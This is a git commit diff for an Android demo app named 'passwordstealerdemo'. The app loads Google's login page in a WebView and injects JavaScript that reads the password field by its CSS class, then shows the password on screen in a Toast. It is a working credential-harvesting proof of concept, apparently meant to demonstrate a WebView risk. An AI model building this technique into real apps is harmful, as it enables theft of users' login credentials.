166319c961da5c6ba0f218034d4933a01c654baf
Spencer Peterson <spencerjpeterson@gmail.com>
2017-05-08 01:36:23 -0700

    complete concept

--- app/src/main/java/spjpeter/ucsc/edu/passwordstealerdemo/MainActivity.java
+++ app/src/main/java/spjpeter/ucsc/edu/passwordstealerdemo/MainActivity.java
@@ -2,6 +2,12 @@ package spjpeter.ucsc.edu.passwordstealerdemo;
 
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
+import android.view.View;
+import android.webkit.ValueCallback;
+import android.webkit.WebSettings;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
+import android.widget.Toast;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -9,5 +15,40 @@ public class MainActivity extends AppCompatActivity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
+
+
+        // get webview
+        WebView webView = (WebView) findViewById(R.id.webView);
+
+        // JS needs to be enabled to steal passwords
+        WebSettings webSettings = webView.getSettings();
+        webSettings.setJavaScriptEnabled(true);
+
+        // "Override" just steals password
+        webView.setWebViewClient(new WebViewClient() {
+            @Override
+            public boolean shouldOverrideUrlLoading(WebView view, String url) {
+                getPassword(view);
+                return false;
+            }
+        });
+
+        webView.loadUrl("https://www.google.com");
+    }
+
+    void getPassword(WebView view) {
+        // Evaluates JS. JS defines a function that finds your password, then calls it, result is
+        // passed to onReceiveValue, which then toasts your password.
+        view.evaluateJavascript("function g() { for (element of document.getElementsByClassName(\"whsOnd zHQkBf\")) { if (element.type === \"password\") { return element.value } } } g()",
+                new ValueCallback<String>() {
+                    @Override
+                    public void onReceiveValue(String value) {
+                        toast(value);
+                    }
+                });
+    }
+
+    private void toast(String text) {
+        Toast.makeText(this, text, Toast.LENGTH_SHORT).show();
     }
 }
